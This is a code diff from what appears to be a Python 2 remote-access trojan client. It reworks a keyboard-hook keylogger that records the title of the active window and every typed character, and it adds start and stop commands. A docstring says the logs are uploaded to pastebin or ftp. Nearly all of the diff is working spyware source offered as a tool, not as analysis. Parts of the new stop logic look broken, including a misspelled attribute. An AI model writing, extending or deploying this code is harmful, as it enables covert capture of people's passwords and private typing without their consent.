@@ -607,7 +607,7 @@ class Client():
         while True:
             try:
                 hm = HookManager()
-                hm.KeyDown = self._event
+                hm.KeyDown = self._keylogger_event
                 hm.HookKeyboard()
                 if os.name is 'nt':
                     PumpMessages()
@@ -632,6 +632,29 @@ class Client():
                     time.sleep(5)
         except Exception as e:
             self._debug("{} returned error: {}".format(manager.func_name, str(e)))
+
+
+    def _keylogger_event(self, event):
+        try:
+
+            if event.WindowName != vars(self.keylogger)['window']:
+                vars(self.keylogger)['window'] = event.WindowName
+                self.keylogger.buffer.write("\n[{}]\n".format(vars(self.keylogger)['window']))
+
+            if event.Ascii > 32 and event.Ascii < 127:
+                self.keylogger.buffer.write(chr(event.Ascii))
+            elif event.Ascii == 32:
+                self.keylogger.buffer.write(' ')
+            elif event.Ascii in (10,13):
+                self.keylogger.buffer.write('\n')
+            elif event.Ascii == 8:
+                self.keylogger.buffer.seek(-1, 1)
+                self.keylogger.buffer.truncate()
+            else:
+                pass
+        except Exception as e:
+            self._debug('{} returned error: {}'.format(self._keylogger_event.func_name, str(e)))
+        return True
 
 
     def _scan_host(self, host):
@@ -1229,29 +1252,6 @@ class Client():
             self._debug('{} error: {}'.format(self._port.func_name, str(e)))
 
 
-    def _event(self, event):
-        try:
-
-            if event.WindowName != vars(self.keylogger)['window']:
-                vars(self.keylogger)['window'] = event.WindowName
-                self.keylogger.buffer.write("\n[{}]\n".format(vars(self.keylogger)['window']))
-
-            if event.Ascii > 32 and event.Ascii < 127:
-                self.keylogger.buffer.write(chr(event.Ascii))
-            elif event.Ascii == 32:
-                self.keylogger.buffer.write(' ')
-            elif event.Ascii in (10,13):
-                self.keylogger.buffer.write('\n')
-            elif event.Ascii == 8:
-                self.keylogger.buffer.seek(-1, 1)
-                self.keylogger.buffer.truncate()
-            else:
-                pass
-        except Exception as e:
-            self._debug('{} returned error: {}'.format(self._event.func_name, str(e)))
-        return True
-
-
     def _server(self):
         if hasattr(self, '__a__') and hasattr(self, '__b__'):
             try:
@@ -1844,20 +1844,36 @@ class Client():
             return "File '{}' not found".format(str(path))
 
 
-    @config(platforms=['win32','linux2','darwin'], max_bytes=4000, buffer=cStringIO.StringIO(), window=None, command=True, usage='keylogger [mode]')
-    def keylogger(self, *args, **kwargs):
+    @config(platforms=['win32','linux2','darwin'], max_bytes=4000, buffer=cStringIO.StringIO(), window=None, command=True, usage='keylogger <start/stop>')
+    def keylogger(self, mode=None):
         """
         run keylogger and upload logs to pastebin or ftp
         """
-        if self.keylogger.func_name not in self.jobs:
-            self.jobs[self.keylogger.func_name] = threading.Thread(target=self._keylogger, name=time.time())
-            self.jobs[self.keylogger.func_name].setDaemon(True)
-            self.jobs[self.keylogger.func_name].start()
-            self.jobs[self._keylogger_manager.func_name] = threading.Thread(target=self._keylogger_manager, args=(self,), name=time.time())
-            self.jobs[self._keylogger_manager.func_name].setDaemon(True)
-            self.jobs[self._keylogger_manager.func_name].start()
-        return self._get_status(self.jobs[self.keylogger.func_name].name)
-    
+        if not mode:
+            if self.keylogger.func_name not in self.jobs:
+                return self.keylogger.usage
+            else:
+                return self._get_status(self.jobs[self.keylogger.func_name].name)
+            
+        elif mode and str(mode) == 'start':
+            if self.keylogger.func_name not in self.jobs:
+                self.jobs[self.keylogger.func_name] = threading.Thread(target=self._keylogger, name=time.time())
+                self.jobs[self.keylogger.func_name].setDaemon(True)
+                self.jobs[self.keylogger.func_name].start()
+                self.jobs[self._keylogger_manager.func_name] = threading.Thread(target=self._keylogger_manager, name=time.time())
+                self.jobs[self._keylogger_manager.func_name].setDaemon(True)
+                self.jobs[self._keylogger_manager.func_name].start()
+                return "Keylogger running"
+            else:
+                return "Keylogger running: {}".format(float(time.time()) - float(self._get_status(self.jobs[self.keylogger_func_name].name)))
+        elif mode and str(mode) == 'stop':
+            if self.keylogger.func_name in self.jobs:
+                for job in self.jobs:
+                    if 'keylogger' in job:
+                         _ = self.jobs.pop(self.keylogger.func_name, None)
+                         del _
+            return "Keylogger stopped"
+                        
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='screenshot [mode]')
     def screenshot(self, *args):
